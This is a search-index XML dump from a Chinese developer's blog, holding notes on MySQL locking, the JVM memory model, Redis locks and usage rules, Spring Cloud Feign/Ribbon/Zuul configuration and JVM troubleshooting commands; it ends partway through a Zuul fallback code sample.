<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[mysql X锁和S锁]]></title>
    <url>%2F2019%2F08%2F24%2Fmysql%2Fmysql-lock%2F</url>
    <content type="text"><![CDATA[mysql X锁和S锁基本的封锁类型有两种:排它锁(X锁)和共享锁(S锁)： 所谓X锁,是事务T对数据A加上X锁时,只允许事务T读取和修改数据A 所谓S锁,是事务T对数据A加上S锁时,其他事务只能再对数据A加S锁,而不能加X锁,直到T释放A上的S锁 若事务T对数据对象A加了S锁,则T就可以对A进行读取,但不能进行更新(S锁因此又称为读锁),在T释放A上的S锁以前,其他事务可以再对A加S锁,但不能加X锁,从而可以读取A,但不能更新A. http://www.cnblogs.com/digdeep/archive/2015/11/16/4968453.html 学习了mysql加锁机制，RC，RR，与字段的索引还有关系，如何防止死锁，不同情况的加锁。 学习where条件的过滤 给定一条SQL，如何提取其中的where条件？where条件中的每个子条件，在SQL执行的过程中有分别起着什么样的作用？ http://hedengcheng.com/?p=577 Index Key 索引查找，第一遍找出最小值，随后需要逐个比较是否满足最大值的条件，得到最大值。 Index First Key — Index Last Key Index Filter 索引过滤，对于索引查找出的值，均需要与索引过滤条件对比 Table Filter 对于没有命中索引的字段，需要回表查出完整记录，对其进行过滤 原文地址]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql-lock</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线程 图谱]]></title>
    <url>%2F2019%2F07%2F12%2Fxmind%2Fxmind-thread%2F</url>
    <content type="text"><![CDATA[v1.5.1更新线程 ThreadPoolExcutor 参数说明 更新队列配置说明 更新spring @Async注解 java锁 详细见xmind-锁]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DB 图谱]]></title>
    <url>%2F2019%2F07%2F12%2Fxmind%2Fxmind-db%2F</url>
    <content type="text"><![CDATA[v1.5.1更新mysql 添加 索引类型【主键、普通、唯一、全文、组合】 索引原理【hash、fulltext、B+Tree】 索引结构【聚簇索引、非聚簇索引】 {———-} mysql 图谱mongodb 图谱 2019 - 8 更新mysql 添加 索引类型【主键、普通、唯一、全文、组合】 索引原理【hash、fulltext、B+Tree】 索引结构【聚簇索引、非聚簇索引】]]></content>
      <categories>
        <category>xmind</category>
        <category>我的技术图谱</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jdk内存模型]]></title>
    <url>%2F2019%2F05%2F26%2Fjdk%2Fjdk-model%2F</url>
    <content type="text"><![CDATA[#8个原子操作针对jvm主内存与工作内存的数据操作12345678lock----锁定unlock----释放锁read----读write----写load----加载assign----赋值use----使用store----写入主内存 特例：long、double、64为内存、在32为虚拟机中分两次操作、load、store、read、write都不是源自操作 #8个规则： 1234567891、不允许read、load、store、write单独出现2、不允许thread丢弃assign3、不允许任何一线程、没有assign的数据 从工作内存store到主内存4、一个新变量只能在主内存“诞生”、对一个变量“use/store”之前、执行assign、load操作5、一个变量在同一时刻只允许一个线程对其进行lock、但lock可以被执行多次、lock标记为累加、多次lock需要多次unlock6、对一个变量执行lock、会清空工作内存中变量值、使用之前需要重新load、assign7、如果未lock、不能unlock8、执行unlock之前、限制性工作内存同步主内存 都挺好理解、计算机这个东西、没啥难度、lock是做标记为int ++ –做锁标记位 #内存可见性 1、volatile2、sychronized3、final #有序性1、线程内表现为串行 #无序1、指令重排序【使用volatile可以阻止指令重排序】2、sychronized 同一个变量、在同一时刻、允许同一线程串行进入 3、编译器静态优化会打乱代码执行顺序4、jvm动态优化会打乱代码执行顺序5、硬件可以打乱执行顺序以优化其性能 #线程安全1、不可变—final2、绝对安全3、相对安全4、线程兼容5、独立—对程序有害 #线程发展史 1、重量级、执行标记位 加sychronized的地方、我在内存中加一个标记为、标记该方法、该对象、我正在使用、你不能使用2、偏向锁、object标记、Mark Word中偏向锁的标识3、轻量级、reentranlock、线程中自建一个object标记、增加了trylock（times）、可队列执行锁方法、规则名aqs、4、算法代替锁、设计思想是、假设没有竞争、竞争时候通过算法判断、cas、拿旧值和内存原值比较、一致则修改为新值]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI 机器学习发展史]]></title>
    <url>%2F2019%2F05%2F26%2Fai%2Fai-002%2F</url>
    <content type="text"><![CDATA[1、模型 M-P神经网络模型 2、1949 Hebb规则 刺激–》加强 训练强化 3、1957 Perception模型 4、1969 感知机模型 不能解决XOR问题 5、1982 离散网络模型、连续网络模型 6、BP算法 多层网络误差反传 7、90中期 orther竞争力学习模型 低潮 8、2006 热点 梯度消失、梯度爆炸、计算机算力提升 神经元传输特性：多输入、单输出 神经元先对入参数据进行求和操作、之后经过激活函数、最终得到data值 感知机 ： 线程分割 不能XOR 【异或】 加入隐藏层 支持XOR 损失函数定义 Tensorflow 定义域 obj定义 操作域 赋值 namescope ： 在同一个变量名不同作用效果、好处、代码配置化 placeholder：运行时赋值session.run{feed.dict=”指定初始值”} 训练模式 ：分批小批数据训练 *深度学习 1、CNN 卷积神经网络【图像识别】 流程：【卷积过程依据特征粒度（特征粒度自己创造的词汇）】输入-》卷积-》池化-》卷积-》池化-》全连接 2、循环神经网络【语言识别、股票预测】 第一个如参值参与后边所有数据入参]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库链接已关闭]]></title>
    <url>%2F2019%2F05%2F24%2Fexception%2Fexception-5%2F</url>
    <content type="text"><![CDATA[1234567Database access problem. Killing off this connection and all remaining connections in the connection pool. SQL State = 08S01 org.springframework.transaction.CannotCreateTransactionException: Could not open JPA EntityManager for transaction; nested exception is javax.persistence. PersistenceException: java.sql.SQLException: Connection is closed! 原因： DBA数据库对连接时间比程序中的连接时间敏感得多、导致数据库连接在数据库端被关闭]]></content>
      <categories>
        <category>java</category>
        <category>exception</category>
      </categories>
      <tags>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 排查命令]]></title>
    <url>%2F2019%2F05%2F15%2Fshell%2Fshell-7%2F</url>
    <content type="text"><![CDATA[pid=11683 #命令查看该进程的线程情况 ps -mp pid -o THREAD,tid,time tid 转为 16进制 printf "%x\n" 6766 1a6e #使用jstack 查看线程使用情况 jstack 11683 | grep 2df4 -A 30 "Thread-38" #51 daemon prio=5 os_prio=0 tid=0x00007f96ec675000 nid=0x2df4 runnable [0x00007f970065a000] #打印线程信息 jstack -l 11683 &gt; /logs/dump.txt #打印对象信息【死锁信息】 jstack -m 11683 &gt; /logs/dump.txt #IO使用率 iostat 5 #系统使用率 vmstat 5 #网络使用率 nicstat 5 #cpu 使用率 typeperf -si | "System\Processor\Queue\Length" jstat pid jstat -option pid option: jstat pidjstat -option pid option: gc gcnew gcold gc cause gc capacity gc old capacity gc perm capacity gc util gc new capacity print compilation compiler class jmap option pid -permstat -histo -J-d64 -heap 其他命令 jcmd jconsole jhat jmap jinfo jstat jstack jvisualvm]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[springboot logger 配置]]></title>
    <url>%2F2019%2F05%2F12%2Fspring-cloud%2Flogger-config%2F</url>
    <content type="text"><![CDATA[logger 配置12345678910logging: config: classpath:logback-spring.xml level: com: netflix: info wuxinvip: info wuxinvip.mapper: DEBUG org: springframework: info root: info 12345678910111213141516171819202122&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- For assistance related to logback-translator or configuration --&gt;&lt;!-- files in general, please contact the logback user mailing list --&gt;&lt;!-- at http://www.qos.ch/mailman/listinfo/logback-user --&gt;&lt;!-- --&gt;&lt;!-- For professional support please see --&gt;&lt;!-- http://www.qos.ch/shop/products/professionalSupport http://logback.qos.ch/translator/--&gt;&lt;configuration&gt; &lt;appender name="console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder&gt; &lt;pattern&gt;%d %p [%c] - &amp;lt;%m&amp;gt;%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root&gt; &lt;appender-ref ref="console"/&gt; &lt;/root&gt;&lt;/configuration&gt;]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node--npm 命令]]></title>
    <url>%2F2019%2F04%2F15%2Fshell%2Fshell-6%2F</url>
    <content type="text"><![CDATA[tar xvf node-v10.15.3-linux-x64.tar #初始化 npm install #安装脚本编译 npm install -g typescript npm run build #jscheck npm run check #部署dev npm run dev #后台启动prod npm start npm run start:redis ########### npm audit npm update handlebars --depth 3 npm audit npm audit fix ############# * 通过pm2启动管理 pm2 status pm2 start 1 pm2 stop rap-server-delos pm2 show rap-server-delos pm2 restart 1 pm2 show 1 pm2 logs redis-server pm2 logs 0 pm2 show 1 pm2 restart 1 pm2 restart 0]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis 锁]]></title>
    <url>%2F2019%2F04%2F13%2Fcache%2Fredis-2%2F</url>
    <content type="text"><![CDATA[redis 锁分类 INCR、SETNX、SET 123456789$redis-&gt;incr($key);$redis-&gt;expire($key, $ttl); //设置生成时间为1秒1、 客户端A请求服务器获取key的值为1表示获取了锁2、 客户端B也去请求服务器获取key的值为2表示获取锁失败3、 客户端A执行代码完成，删除锁4、 客户端B在等待一段时间后在去请求的时候获取key的值为1表示获取锁成功5、 客户端B执行代码完成，删除锁 123456789$redis-&gt;setNX($key, $value);$redis-&gt;expire($key, $ttl);1、 客户端A请求服务器设置key的值，如果设置成功就表示加锁成功2、 客户端B也去请求服务器设置key的值，如果返回失败，那么就代表加锁失败3、 客户端A执行代码完成，删除锁4、 客户端B在等待一段时间后在去请求设置key的值，设置成功5、 客户端B执行代码完成，删除锁 12345678$redis-&gt;set($key, $value, array(&apos;nx&apos;, &apos;ex&apos; =&gt; $ttl)); //ex表示秒1、 客户端A请求服务器设置key的值，如果设置成功就表示加锁成功2、 客户端B也去请求服务器设置key的值，如果返回失败，那么就代表加锁失败3、 客户端A执行代码完成，删除锁4、 客户端B在等待一段时间后在去请求设置key的值，设置成功5、 客户端B执行代码完成，删除锁 锁临界问题 解决方案 【循环锁】 1234567891011121314151617do &#123; $timeout = 10; $roomid = 10001; $key = &apos;room_lock&apos;; $value = &apos;room_&apos;.$roomid; //分配一个随机的值针对问题3 $isLock = Redis::set($key, $value, &apos;ex&apos;, $timeout, &apos;nx&apos;);//ex 秒 if ($isLock) &#123; if (Redis::get($key) == $value) &#123; //防止提前过期，误删其它请求创建的锁 //执行内部代码 Redis::del($key); continue;//执行成功删除key并跳出循环 &#125; &#125; else &#123; usleep(5000); //睡眠，降低抢锁频率，缓解redis压力，针对问题2 &#125;&#125; while(!$isLock); {———-} 封装spring-data-redis操作redis分布式锁123456789101112131415161718192021222324252627282930313233/** * 操作redis获取全局锁 * * @param redisLock 锁的名称 * @param timeout 获取的超时时间 * @param tryInterval 多少ms尝试一次 * @return true 获取成功，false获取失败 */ public boolean getLock(RedisLock redisLock, long timeout, long tryInterval)&#123; try&#123; if(StringUtils.isEmpty(redisLock.getKey()) || StringUtils.isEmpty(redisLock.getValue()))&#123; return false; &#125; while (true)&#123; List&lt;String&gt; keys = new ArrayList&lt;&gt;(1); keys.add(redisLock.getKey()); String result = this.execute(new RedisCallback&lt;String&gt;() &#123; @Override public String doInRedis(RedisConnection connection) throws DataAccessException &#123; JedisCommands commands = (JedisCommands) connection.getNativeConnection(); return commands.set(redisLock.getKey(), redisLock.getValue(), &quot;NX&quot;, &quot;PX&quot;, redisLock.getLockExpireTime()); &#125; &#125;); if (StringUtils.isNotEmpty(result))&#123; return true; &#125; Thread.sleep(tryInterval); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); return false; &#125; &#125; this.execute(new RedisCallback() //封装 spring-data-redis 分布式锁//获取redisnativeConnection 初始化为 JedisCommands返回操作类JedisCommands commands = (JedisCommands) connection.getNativeConnection();//使用commands操作类设置数据锁return commands.set(redisLock.getKey(), redisLock.getValue(), “NX”, “PX”, redisLock.getLockExpireTime()); 1234567891011121314151617181920212223242526272829 /** * 释放锁 */ public void releaseLock(RedisLock redisLock) &#123; final List&lt;String&gt; keys = new ArrayList(1); final List&lt;String&gt; args = new ArrayList(1); keys.add(redisLock.getKey()); args.add(redisLock.getValue()); Long result = this.execute(new RedisCallback&lt;Long&gt;() &#123; @Override public Long doInRedis(RedisConnection connection) throws DataAccessException &#123; Object nativeConnection = connection.getNativeConnection(); // 集群模式和单机模式虽然执行脚本的方法一样，但是没有共同的接口，所以只能分开执行 // 集群模式 if (nativeConnection instanceof JedisCluster) &#123; return (Long) ((JedisCluster) nativeConnection).eval(EQ_DEL_STR, keys, args); &#125; // 单机模式 else if (nativeConnection instanceof Jedis) &#123; return (Long) ((Jedis) nativeConnection).eval(EQ_DEL_STR, keys, args); &#125; return 0L; &#125; &#125;); &#125;` 释放锁 调用spring-data-redis封装类 ResdTemplate.excute() 返回类型初始化为 JedisCluster 或者 Jedis操作类 调用 eval方法 解锁数据]]></content>
      <categories>
        <category>java</category>
        <category>cache</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[feign ribbon 配置]]></title>
    <url>%2F2019%2F04%2F12%2Fspring-cloud%2Ffeign-ribbon-config%2F</url>
    <content type="text"><![CDATA[feign 配置官方文档配置 123456789101112131415161718192021222324252627282930313233feign: client: config: feignName: connectTimeout: 5000 readTimeout: 5000 loggerLevel: full errorDecoder: com.example.SimpleErrorDecoder retryer: com.example.SimpleRetryer requestInterceptors: - com.example.FooRequestInterceptor - com.example.BarRequestInterceptor decode404: false encoder: com.example.SimpleEncoder decoder: com.example.SimpleDecoder contract: com.example.SimpleContract default: connectTimeout: 5000 readTimeout: 5000 loggerLevel: basic# To disable Hystrix in Feign hystrix: enabled: false # To set thread isolation to SEMAPHOREhystrix: command: default: execution: isolation: strategy: SEMAPHORE 123456789101112# 配置请求GZIP压缩feign.compression.request.enabled=true# 配置响应GZIP压缩feign.compression.response.enabled=true# 配置压缩支持的MIME TYPEfeign.compression.request.mime-types=text/xml,application/xml,application/json# 配置压缩数据大小的下限feign.compression.request.min-request-size=2048#熔断feign.hystrix.enabled=false ribbon 配置官方文档 123456789101112131415users: ribbon: NIWSServerListClassName: com.netflix.loadbalancer.ConfigurationBasedServerList NFLoadBalancerRuleClassName: com.netflix.loadbalancer.WeightedResponseTimeRulestores: ribbon: listOfServers: example.com,google.comribbon: eureka: enabled: false eager-load: enabled: true clients: client1, client2, client3 123456789101112131415161718# 设置连接超时时间ribbon.ConnectTimeout=3000# 设置读取超时时间ribbon.ReadTimeout=2000# 对所有操作请求都进行重试ribbon.OkToRetryOnAllOperations=true# 切换实例的重试次数ribbon.MaxAutoRetriesNextServer=2# 对当前实例的重试次数ribbon.MaxAutoRetries=1#切换实例的重试次数ribbon.MaxAutoRetriesNextServer=1#暂不开启重试,以防请求重复spring.cloud.loadbalancer.retry.enabled=false 这种配置是一种全局配置，就是是对所有的请求生效的，如果我想针对不同的服务配置不同的连接超时和读取超时，那么我们可以在属性的前面加上服务的名字，如下： 123456789101112# 设置针对hello-service服务的连接超时时间hello-service.ribbon.ConnectTimeout=600# 设置针对hello-service服务的读取超时时间hello-service.ribbon.ReadTimeout=6000# 设置针对hello-service服务所有操作请求都进行重试hello-service.ribbon.OkToRetryOnAllOperations=true# 设置针对hello-service服务切换实例的重试次数hello-service.ribbon.MaxAutoRetriesNextServer=2# 设置针对hello-service服务的当前实例的重试次数hello-service.ribbon.MaxAutoRetries=1]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[feign ribbon 配置]]></title>
    <url>%2F2019%2F04%2F12%2Fspring-cloud%2Fhystrix-config%2F</url>
    <content type="text"><![CDATA[feign 配置官方文档配置 123456789101112131415161718192021222324252627282930313233feign: client: config: feignName: connectTimeout: 5000 readTimeout: 5000 loggerLevel: full errorDecoder: com.example.SimpleErrorDecoder retryer: com.example.SimpleRetryer requestInterceptors: - com.example.FooRequestInterceptor - com.example.BarRequestInterceptor decode404: false encoder: com.example.SimpleEncoder decoder: com.example.SimpleDecoder contract: com.example.SimpleContract default: connectTimeout: 5000 readTimeout: 5000 loggerLevel: basic# To disable Hystrix in Feign hystrix: enabled: false # To set thread isolation to SEMAPHOREhystrix: command: default: execution: isolation: strategy: SEMAPHORE 123456789101112# 配置请求GZIP压缩feign.compression.request.enabled=true# 配置响应GZIP压缩feign.compression.response.enabled=true# 配置压缩支持的MIME TYPEfeign.compression.request.mime-types=text/xml,application/xml,application/json# 配置压缩数据大小的下限feign.compression.request.min-request-size=2048#熔断feign.hystrix.enabled=false ribbon 配置官方文档 123456789101112131415users: ribbon: NIWSServerListClassName: com.netflix.loadbalancer.ConfigurationBasedServerList NFLoadBalancerRuleClassName: com.netflix.loadbalancer.WeightedResponseTimeRulestores: ribbon: listOfServers: example.com,google.comribbon: eureka: enabled: false eager-load: enabled: true clients: client1, client2, client3 123456789101112131415161718# 设置连接超时时间ribbon.ConnectTimeout=3000# 设置读取超时时间ribbon.ReadTimeout=2000# 对所有操作请求都进行重试ribbon.OkToRetryOnAllOperations=true# 切换实例的重试次数ribbon.MaxAutoRetriesNextServer=2# 对当前实例的重试次数ribbon.MaxAutoRetries=1#切换实例的重试次数ribbon.MaxAutoRetriesNextServer=1#暂不开启重试,以防请求重复spring.cloud.loadbalancer.retry.enabled=false 这种配置是一种全局配置，就是是对所有的请求生效的，如果我想针对不同的服务配置不同的连接超时和读取超时，那么我们可以在属性的前面加上服务的名字，如下： 123456789101112# 设置针对hello-service服务的连接超时时间hello-service.ribbon.ConnectTimeout=600# 设置针对hello-service服务的读取超时时间hello-service.ribbon.ReadTimeout=6000# 设置针对hello-service服务所有操作请求都进行重试hello-service.ribbon.OkToRetryOnAllOperations=true# 设置针对hello-service服务切换实例的重试次数hello-service.ribbon.MaxAutoRetriesNextServer=2# 设置针对hello-service服务的当前实例的重试次数hello-service.ribbon.MaxAutoRetries=1]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis 规范]]></title>
    <url>%2F2019%2F04%2F11%2Fcache%2Fredis-1%2F</url>
    <content type="text"><![CDATA[原文链接 键值设计 命令使用 客户端使用 相关工具 附录【4.0遍历删除】 {———-} 1、键值设计 1、key名设计 1、可读性和可管理性 以业务名 (或数据库名) 为前缀 (防止 key 冲突)，用冒号分隔，比如业务名: 表名:id ugc:video:1 2、简洁性 保证语义的前提下，控制key的长度，当key较多时，内存占用也不容忽视，例如： user:{uid}:friends:messages:{mid}简化为u:{uid}:fr:m:{mid}。 3、不要包含特殊字符 反例：包含空格、换行、单双引号以及其他转义字符 2、value设计 1、拒绝bigkey 防止网卡流量、慢查询，string类型控制在10KB以内，hash、list、set、zset元素个数不要超过5000。 反例：一个包含200万个元素的list。 非字符串的bigkey，不要使用del删除，使用hscan、sscan、zscan、[相关文章](http://doc.redisfans.com/key/scan.html)方式渐进式删除， 同时要注意防止bigkey过期时间自动删除问题(例如一个200万的zset设置1小时过期，会触发del操作， 造成阻塞，而且该操作不会不出现在慢查询中(latency可查))，查找方法和删除方法 2、选择适合的数据类型 例如：实体类型(要合理控制和使用数据结构内存编码优化配置, 例如ziplist，但也要注意节省内存和性能之间的平衡)。 了解下，Redis 为什么这么快？ 反例： set user: 1 :name tom set user: 1 :age 19 set user: 1 :favor football 正例: hmset user: 1 name tom age 19 favor football 3、控制key的生命周期 redis不是垃圾桶，建议使用expire设置过期时间(条件允许可以打散过期时间，防止集中过期)， 不过期的数据重点关注idletime。 2、命令使用 1、O(N)命令关注N的数量 例如hgetall、lrange、smembers、zrange、sinter等并非不能使用，但是需要明确N的值。 有遍历的需求可以使用hscan、sscan、zscan、相关文章代替。 2、禁用命令 禁止线上使用keys、flushall、flushdb等，通过redis的rename机制禁掉命令，或者使用scan、相关文章的方式渐进式处理。 一个致命的 Redis 命令，导致公司损失 400 万！！ 3、合理使用select redis的多数据库较弱，使用数字进行区分，很多客户端支持较差，同时多业务用多数据库实际还是单线程处理，会有干扰。 4、使用批量操作提高效率 原生命令：例如mget、mset。 非原生命令：可以使用pipeline提高效率。 但要注意控制一次批量操作的元素个数(例如500以内，实际也和元素字节数有关)。 注意两者不同： 原生是原子操作，pipeline是非原子操作。 pipeline可以打包不同的命令，原生做不到 pipeline需要客户端和服务端同时支持。 5、不建议过多使用Redis事务功能 Redis的事务功能较弱(不支持回滚)，而且集群版本(自研和官方)要求一次事务操作的key必须在一个slot上(可以使用hashtag功能解决)。 6、Redis集群版本在使用Lua上有特殊要求 1、所有key都应该由 KEYS 数组来传递，redis.call/pcall 里面调用的redis命令，key的位置， 必须是KEYS array, 否则直接返回error， &quot;-ERR bad lua script for redis cluster, all the keys that the script uses should be passed using the KEYS arrayrn&quot; 2、所有key，必须在1个slot上，否则直接返回error, “-ERR eval/evalsha command keys must in same slotrn” 7、monitor命令 必要情况下使用monitor命令时，要注意不要长时间使用。 3、客户端使用 1、避免多个应用使用一个Redis实例 不相干的业务拆分，公共数据做服务化。 2、使用连接池 可以有效控制连接，同时提高效率，标准使用方式： 12345678910111213Jedis jedis = null;try &#123; jedis = jedisPool.getResource(); //具体的命令 jedis.executeCommand()&#125; catch (Exception e) &#123; logger.error("op key &#123;&#125; error: " + e.getMessage(), key, e);&#125; finally &#123; //注意这里不是关闭连接，在JedisPool模式下，Jedis会被归还给资源池。 if (jedis != null) jedis.close();&#125; 3、熔断功能 高并发下建议客户端添加熔断功能(例如netflix hystrix) 4、合理的加密 设置合理的密码，如有必要可以使用SSL加密访问（阿里云Redis支持） 5、淘汰策略 根据自身业务类型，选好maxmemory-policy(最大内存淘汰策略)，设置好过期时间。 默认策略是volatile-lru 即超过最大内存后，在过期键中使用lru算法进行key的剔除， 保证不过期数据不被删除，但是可能会出现OOM问题。 其他策略如下： allkeys-lru：根据LRU算法删除键，不管数据有没有设置超时属性，直到腾出足够空间为止。 allkeys-random：随机删除所有键，直到腾出足够空间为止。 volatile-random:随机删除过期键，直到腾出足够空间为止。 volatile-ttl：根据键值对象的ttl属性，删除最近将要过期数据。如果没有，回退到noeviction策略。 noeviction：不会剔除任何数据，拒绝所有写入操作并返回客户端错误信息 &quot;(error) OOM command not allowed when used memory&quot;，此时Redis只响应读操作。 4、相关工具 1、数据同步 redis间数据同步可以使用：redis-port 2、big key搜索 redis大key搜索工具 3、热点key寻找 内部实现使用monitor，所以建议短时间使用facebook的redis-faina阿里云Redis已经在内核层面解决热点key问题 5、附录 1、删除 bigkey 下面操作可以使用pipeline加速。 redis 4.0已经支持key的异步删除，欢迎使用。 1、Hash删除: hscan + hdel 123456789101112131415161718192021public void delBigHash(String host, int port, String password, String bigHashKey) &#123; Jedis jedis = new Jedis(host, port); if (password != null &amp;&amp; !"".equals(password)) &#123; jedis.auth(password); &#125; ScanParams scanParams = new ScanParams().count(100); String cursor = "0"; do &#123; ScanResult&lt;Entry&lt;String, String&gt;&gt; scanResult = jedis.hscan(bigHashKey, cursor, scanParams); List&lt;Entry&lt;String, String&gt;&gt; entryList = scanResult.getResult(); if (entryList != null &amp;&amp; !entryList.isEmpty()) &#123; for (Entry&lt;String, String&gt; entry : entryList) &#123; jedis.hdel(bigHashKey, entry.getKey()); &#125; &#125; cursor = scanResult.getStringCursor(); &#125; while (!"0".equals(cursor)); //删除bigkey jedis.del(bigHashKey);&#125; 2、List删除: ltrim 12345678910111213141516public void delBigList(String host, int port, String password, String bigListKey) &#123; Jedis jedis = new Jedis(host, port); if (password != null &amp;&amp; !&quot;&quot;.equals(password)) &#123; jedis.auth(password); &#125; long llen = jedis.llen(bigListKey); int counter = 0; int left = 100; while (counter &lt; llen) &#123; //每次从左侧截掉100个 jedis.ltrim(bigListKey, left, llen); counter += left; &#125; //最终删除key jedis.del(bigListKey);&#125; 3、Set删除: sscan + srem 123456789101112131415161718192021public void delBigSet(String host, int port, String password, String bigSetKey) &#123; Jedis jedis = new Jedis(host, port); if (password != null &amp;&amp; !&quot;&quot;.equals(password)) &#123; jedis.auth(password); &#125; ScanParams scanParams = new ScanParams().count(100); String cursor = &quot;0&quot;; do &#123; ScanResult&lt;String&gt; scanResult = jedis.sscan(bigSetKey, cursor, scanParams); List&lt;String&gt; memberList = scanResult.getResult(); if (memberList != null &amp;&amp; !memberList.isEmpty()) &#123; for (String member : memberList) &#123; jedis.srem(bigSetKey, member); &#125; &#125; cursor = scanResult.getStringCursor(); &#125; while (!&quot;0&quot;.equals(cursor)); //删除bigkey jedis.del(bigSetKey);&#125; 4、SortedSet删除: zscan + zrem 123456789101112131415161718192021public void delBigZset(String host, int port, String password, String bigZsetKey) &#123; Jedis jedis = new Jedis(host, port); if (password != null &amp;&amp; !&quot;&quot;.equals(password)) &#123; jedis.auth(password); &#125; ScanParams scanParams = new ScanParams().count(100); String cursor = &quot;0&quot;; do &#123; ScanResult&lt;Tuple&gt; scanResult = jedis.zscan(bigZsetKey, cursor, scanParams); List&lt;Tuple&gt; tupleList = scanResult.getResult(); if (tupleList != null &amp;&amp; !tupleList.isEmpty()) &#123; for (Tuple tuple : tupleList) &#123; jedis.zrem(bigZsetKey, tuple.getElement()); &#125; &#125; cursor = scanResult.getStringCursor(); &#125; while (!&quot;0&quot;.equals(cursor)); //删除bigkey jedis.del(bigZsetKey);&#125;]]></content>
      <categories>
        <category>java</category>
        <category>cache</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring boot mybatis 配置]]></title>
    <url>%2F2019%2F03%2F18%2Fspring-cloud%2Fspring-boot-mybatis-config%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031#MYBATIS#---------------------------mybatis-plus-------------------------## mapper 位置mybatis-plus.mapper-locations=classpath:/mapper/*Mapper.xml#实体类扫描包#mybatis-plus.type-aliases-package=cn.wuxinvip.demo.entity#主键类型 0:&quot;数据库ID自增&quot;, 1:&quot;用户输入ID&quot;,2:&quot;全局唯一ID (数字类型唯一ID)&quot;, 3:&quot;全局唯一ID UUID&quot;;mybatis-plus.global-config.id-type=1#字段策略 0:&quot;忽略判断&quot;,1:&quot;非 NULL 判断&quot;),2:&quot;非空判断&quot;mybatis-plus.global-config.field-strategy=2#驼峰下划线转换mybatis-plus.global-config.db-column-underline=true#刷新mapper 调试神器，开发环境使用，部署环境必须关掉mybatis-plus.global-config.refresh-mapper=true#数据库大写下划线转换#mybatis-plus.global-config.capital-mode=true#序列接口实现类配置#mybatis-plus.global-config.key-generator=com.baomidou.springboot.xxx#逻辑删除配置#mybatis-plus.global-config.logic-delete-value=0#mybatis-plus.global-config.logic-not-delete-value=1#自定义填充策略接口实现#mybatis-plus.global-config.meta-object-handler=com.baomidou.springboot.xxx#自定义SQL注入器#mybatis-plus.global-config.sql-injector=com.baomidou.springboot.xxx#mybatis-plus.global-config.meta-object-handler=cn.wuxinvip.demo.base.ObjectHandler#下划线转驼峰mybatis-plus.configuration.map-underscore-to-camel-case=true# 缓存开关mybatis-plus.configuration.cache-enabled=false]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zuul 熔断和重试]]></title>
    <url>%2F2019%2F03%2F18%2Fspring-cloud%2Fzuul-2%2F</url>
    <content type="text"><![CDATA[zuul 重试12345678910111213141516171819202122232425262728结合spring retry依赖jar导入 &lt;!-- https://mvnrepository.com/artifact/org.springframework.retry/spring-retry --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.retry&lt;/groupId&gt; &lt;artifactId&gt;spring-retry&lt;/artifactId&gt; &lt;version&gt;1.2.4.RELEASE&lt;/version&gt; &lt;/dependency&gt; or // https://mvnrepository.com/artifact/org.springframework.retry/spring-retry compile group: 'org.springframework.retry', name: 'spring-retry', version: '1.2.4.RELEASE'properties #retry #是否开启重试功能 zuul.retryable=true #对当前服务的重试次数 ribbon.MaxAutoRetries=2 #切换相同Server的次数 ribbon.MaxAutoRetriesNextServer=0开启重试如果在短时间内大量请求重试、会造成雪崩、建议次数不要太多、根据部署的稳定性和容错性、适当调整重试次数 {———-} zuul 熔断1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/** * @title: * @description: * @author: wuxin * @date:2019/4/17 13:27 * @location com.wuxinvip.apigateway.fallback.DemoFallBack.class */public class DemoFallBack extends FallBack implements FallbackProvider &#123; private static Logger logger = LoggerFactory.getLogger(DemoFallBack.class); //指定要处理的 service。 @Override public String getRoute() &#123; return &quot;project-center&quot;; &#125; //返回响应 @Override public ClientHttpResponse fallbackResponse(String route, Throwable cause) &#123; if (cause != null &amp;&amp; cause.getCause() != null) &#123; String reason = cause.getCause().getMessage(); logger.info(&quot;Excption &#123;&#125;&quot;,reason); &#125; return fallbackResponse(); &#125;&#125;/** * @title: * @description: * @author: wuxin * @date:2019/4/17 13:31 * @location com.wuxinvip.apigateway.common.FallBackUtil.class */public class FallBack &#123; public ClientHttpResponse fallbackResponse() 